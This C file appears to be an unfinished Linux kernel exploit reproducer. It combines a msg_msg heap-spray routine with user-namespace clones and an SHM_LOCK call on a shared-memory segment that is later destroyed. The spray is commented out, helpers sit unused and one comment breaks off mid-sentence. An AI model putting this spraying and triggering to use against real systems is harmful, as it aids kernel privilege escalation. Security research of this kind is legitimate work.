#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/sem.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/msg.h>

typedef struct {
  long mtype;
  char mtext[1];
} msg;



int32_t make_queue(key_t key, int msgflg) {
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (ret < 0) {
        perror("msgrcv");
        //exit(-1);
    }
    return ret;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg) {
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) {
        perror("msgsend failure");
        //exit(-1);
    }
    return;
}

#define SEGMENT_SIZE 0x10000
#define SPRAY_512 1000


int spray_512_qids[SPRAY_512];
uint64_t setxattr_bufs[SPRAY_512];
pthread_t thids[SPRAY_512];

void spray_512() {
  char buffer[0x4000] = {0};
  msg *message = (msg *)buffer;

  memset(buffer, 0x41, sizeof(buffer));
  for (int i = 0; i < SPRAY_512; i++) {
  int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(spray, message, 192 - 0x30, 0);
    spray_512_qids[i] = spray;
  }
}
/* A simple error-handling function: print an error message based
  on the value in 'errno' and terminate the calling process. */

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

struct child_args {
   char **argv;        /* Command to be executed by child, with args */
   int    pipe_fd[2];  /* Pipe used to synchronize parent and child */
};

static int verbose;

static void usage(char *pname)
{
   fprintf(stderr, "Usage: %s [options] cmd [arg...]\n\n", pname);
   fprintf(stderr, "Create a child process that executes a shell "
           "command in a new user namespace,\n"
           "and possibly also other new namespace(s).\n\n");
   fprintf(stderr, "Options can be:\n\n");
#define fpe(str) fprintf(stderr, "    %s", str);
   fpe("-i          New IPC namespace\n");
   fpe("-m          New mount namespace\n");
   fpe("-n          New network namespace\n");
   fpe("-p          New PID namespace\n");
   fpe("-u          New UTS namespace\n");
   fpe("-U          New user namespace\n");
   fpe("-M uid_map  Specify UID map for user namespace\n");
   fpe("-G gid_map  Specify GID map for user namespace\n");
   fpe("-z          Map user's UID and GID to 0 in user namespace\n");
   fpe("            (equivalent to: -M '0 <uid> 1' -G '0 <gid> 1')\n");
   fpe("-v          Display verbose messages\n");
   fpe("\n");
   fpe("If -z, -M, or -G is specified, -U is required.\n");
   fpe("It is not permitted to specify both -z and either -M or -G.\n");
   fpe("\n");
   fpe("Map strings for -M and -G consist of records of the form:\n");
   fpe("\n");
   fpe("    ID-inside-ns   ID-outside-ns   len\n");
   fpe("\n");
   fpe("A map string can contain multiple records, separated"
       " by commas;\n");
   fpe("the commas are replaced by newlines before writing"
       " to map files.\n");

   exit(EXIT_FAILURE);
}

/* Update the mapping file 'map_file', with the value provided in
  'mapping', a string that defines a UID or GID mapping. A UID or
  GID mapping consists of one or more newline-delimited records
  of the form:

      ID_inside-ns    ID-outside-ns   length

  Requiring the user to supply a string that contains newlines is
  of course inconvenient for command-line use. Thus, we permit the
  use of commas to delimit records in this string, and replace them
  with newlines before writing the string to the file. */

static void
update_map(char *mapping, char *map_file)
{
   int fd;
   size_t map_len;     /* Length of 'mapping' */

   /* Replace commas in mapping string with newlines. */

   map_len = strlen(mapping);
   for (int j = 0; j < map_len; j++)
       if (mapping[j] == ',')
           mapping[j] = '\n';

   fd = open(map_file, O_RDWR);
   if (fd == -1) {
       fprintf(stderr, "ERROR: open %s: %s\n", map_file,
               strerror(errno));
       exit(EXIT_FAILURE);
   }

   if (write(fd, mapping, map_len) != map_len) {
       fprintf(stderr, "ERROR: write %s: %s\n", map_file,
               strerror(errno));
       exit(EXIT_FAILURE);
   }

   close(fd);
}

/* Linux 3.19 made a change in the handling of setgroups(2) and the
  'gid_map' file to address a security issue. The issue allowed
  *unprivileged* users to employ user namespaces in order to drop
  The upshot of the 3.19 changes is that in order to update the
  'gid_maps' file, use of the setgroups() system call in this
  user namespace must first be disabled by writing "deny" to one of
  the /proc/PID/setgroups files for this namespace.  That is the
  purpose of the following function. */

static void
proc_setgroups_write(pid_t child_pid, char *str)
{
   char setgroups_path[PATH_MAX];
   int fd;

   snprintf(setgroups_path, PATH_MAX, "/proc/%jd/setgroups",
           (intmax_t) child_pid);

   fd = open(setgroups_path, O_RDWR);
   if (fd == -1) {

       /* We may be on a system that doesn't support
          /proc/PID/setgroups. In that case, the file won't exist,
          and the system won't impose the restrictions that Linux 3.19
          added. That's fine: we don't need to do anything in order
          to permit 'gid_map' to be updated.

          However, if the error from open() was something other than
          the ENOENT error that is expected for that case,  let the
          user know. */

       if (errno != ENOENT)
           fprintf(stderr, "ERROR: open %s: %s\n", setgroups_path,
               strerror(errno));
       return;
   }

   if (write(fd, str, strlen(str)) == -1)
       fprintf(stderr, "ERROR: write %s: %s\n", setgroups_path,
           strerror(errno));

   close(fd);
}
void *sh_mem;
int segment_id;
static int              /* Start function for cloned child */
childFunc(void *arg)
{
   printf("CHILD EXECUTING\n");
   char *x = "ciaoo";
   printf("SHM_LOCK: %d\n", SHM_LOCK);
   shmctl(segment_id, SHM_LOCK, NULL);
   memcpy(sh_mem, (void *)x, 4);
   printf("FINISH EXECUTION\n");
   exit(0);
}

static int dummy_child(void *arg)
{
    sleep(10000);
    exit(0);
}

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];    /* Space for child's stack */

int
main(int argc, char *argv[])
{
   int flags, opt, map_zero;
   pid_t child_pid;
   struct child_args args;
   char *uid_map, *gid_map;
   const int MAP_BUF_SIZE = 100;
   char map_buf[MAP_BUF_SIZE];
   char map_path[PATH_MAX];

   cpu_set_t my_set;
   CPU_ZERO(&my_set);
   CPU_SET(0, &my_set);
   if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
       perror("sched_setaffinity()");
       exit(1);
   }

   /* Parse command-line options. The initial '+' character in
      the final getopt() argument prevents GNU-style permutation
      of command-line options. That's useful, since sometimes
      the 'command' to be executed by this program itself
      has command-line options. We don't want getopt() to treat
      those as options to this program. */

   flags = 0;
   verbose = 1;
   gid_map = NULL;
   uid_map = NULL;
   map_zero = 0;
   flags |= CLONE_NEWUSER;

   /* We use a pipe to synchronize the parent and child, in order to
      ensure that the parent sets the UID and GID maps before the child
      calls execve(). This ensures that the child maintains its
      capabilities during the execve() in the common case where we
      want to map the child's effective user ID to 0 in the new user
      namespace. Without this synchronization, the child would lose
      its capabilities if it performed an execve() with nonzero
      user IDs (see the capabilities(7) man page for details of the
      transformation of a process's capabilities during execve()). */

   if (pipe(args.pipe_fd) == -1)
       errExit("pipe");

   /* Create the child in new namespace(s). */

   segment_id = shmget (IPC_PRIVATE, SEGMENT_SIZE,
                    IPC_CREAT | IPC_EXCL | S_IRUSR | S_IWUSR);
   sh_mem = (void *)shmat(segment_id, NULL, 0);

   printf("CREATE DUMMY CHILD\n");
   void *ptr[13];
   int dummy_ch = 0;
   for(int i = 0; i < 12; i++) {
       ptr[i] = malloc(0x10000);
       printf("ptr: %p\n", ptr);
       dummy_ch = clone(dummy_child, ptr[i], flags, &args);
       printf("done %d clone\n", i);
   }
   printf("segment id: %d\t address: %p\n", segment_id, sh_mem);

   printf("BEFORE CREATING USEFUL CHILD\n");
   child_pid = clone(childFunc, child_stack + STACK_SIZE,
                     flags | SIGCHLD, &args);
   if (child_pid == -1)
       errExit("clone");
   /* Parent falls through to here. */

   if (verbose)
       printf("%s: PID of child created by clone() is %jd\n",
               argv[0], (intmax_t) child_pid);

   if (waitpid(child_pid, NULL, 0) == -1)      /* Wait for child */
       errExit("waitpid");

   // spray_512();
   printf("%s\n", (char *)sh_mem);
   printf("DESTROY SHARED MEMORY\n");
   shmdt(sh_mem);
   shmctl(segment_id, IPC_RMID, 0);
    

   printf("EXITING\n");

   /* Update the UID and GID maps in the child. */

   exit(EXIT_SUCCESS);
}

